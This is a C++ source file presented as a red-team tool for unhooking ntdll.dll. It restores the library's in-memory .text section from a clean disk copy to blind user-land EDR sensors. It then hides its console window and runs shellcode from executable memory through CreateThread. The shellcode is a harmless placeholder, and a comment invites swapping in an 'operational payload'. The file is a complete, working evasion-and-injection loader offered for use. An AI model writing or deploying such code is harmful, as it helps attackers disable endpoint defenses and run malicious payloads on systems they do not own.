#include <windows.h>
#include <iostream>
#include <string>

/**
 * Senior Red Team Implementation: NTDLL API Unhooking
 * Target: Bypass user-land EDR sensors by restoring the .text section of ntdll.dll
 * Method: Manual mapping of disk-based ntdll.dll and precise memory overwrite
 */

void ExecutePayload() {
    // Example payload: x64 shellcode (xor eax, eax; ret)
    // Replace with actual operational payload
    unsigned char payload[] = { 0x31, 0xC0, 0xC3 };
    SIZE_T payloadSize = sizeof(payload);

    LPVOID execMem = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) return;

    memcpy(execMem, payload, payloadSize);

    // Execute via CreateThread to simulate standard injection behavior
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    VirtualFree(execMem, 0, MEM_RELEASE);
}

bool UnhookNtdll() {
    const char* ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    // 1. Map fresh copy of ntdll.dll from disk
    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = GetFileSize(hFile, nullptr);
    HANDLE hMapping = CreateFileMappingA(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    CloseHandle(hFile);
    if (!hMapping) return false;

    PBYTE pCleanDll = (PBYTE)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMapping);
    if (!pCleanDll) return false;

    // 2. Parse PE Headers for both images
    PIMAGE_DOS_HEADER dosClean = (PIMAGE_DOS_HEADER)pCleanDll;
    PIMAGE_NT_HEADERS ntClean = (PIMAGE_NT_HEADERS)(pCleanDll + dosClean->e_lfanew);

    PIMAGE_DOS_HEADER dosMem = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntMem = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dosMem->e_lfanew);

    // 3. Locate the .text section in both images
    PIMAGE_SECTION_HEADER sectionClean = IMAGE_FIRST_SECTION(ntClean);
    PIMAGE_SECTION_HEADER sectionMem = IMAGE_FIRST_SECTION(ntMem);

    PIMAGE_SECTION_HEADER pTextClean = nullptr;
    PIMAGE_SECTION_HEADER pTextMem = nullptr;

    for (int i = 0; i < ntClean->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sectionClean[i].Name, ".text") == 0) {
            pTextClean = &sectionClean[i];
            break;
        }
    }

    for (int i = 0; i < ntMem->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sectionMem[i].Name, ".text") == 0) {
            pTextMem = &sectionMem[i];
            break;
        }
    }

    if (!pTextClean || !pTextMem) {
        UnmapViewOfFile(pCleanDll);
        return false;
    }

    // 4. Perform the unhooking overwrite
    // Calculate the target address in the currently loaded ntdll
    PBYTE pTargetText = (PBYTE)hNtdll + pTextMem->VirtualAddress;
    DWORD dwVirtualSize = pTextMem->Misc.VirtualSize;
    DWORD dwRawSize = pTextClean->SizeOfRawData;
    PBYTE pSourceText = pCleanDll + pTextClean->PointerToRawData;

    DWORD oldProtect = 0;
    if (VirtualProtect(pTargetText, dwVirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        // Copy the original raw bytes from disk
        memcpy(pTargetText, pSourceText, dwRawSize);

        // To ensure perfection, zero out any remaining padding between RawSize and VirtualSize
        // This replicates the exact state produced by the Windows Loader
        if (dwVirtualSize > dwRawSize) {
            memset(pTargetText + dwRawSize, 0, dwVirtualSize - dwRawSize);
        }

        VirtualProtect(pTargetText, dwVirtualSize, oldProtect, &oldProtect);
    }

    UnmapViewOfFile(pCleanDll);
    return true;
}

int main() {
    // Stealth: Hide console window
    FreeConsole();

    if (UnhookNtdll()) {
        ExecutePayload();
    }

    return 0;
}
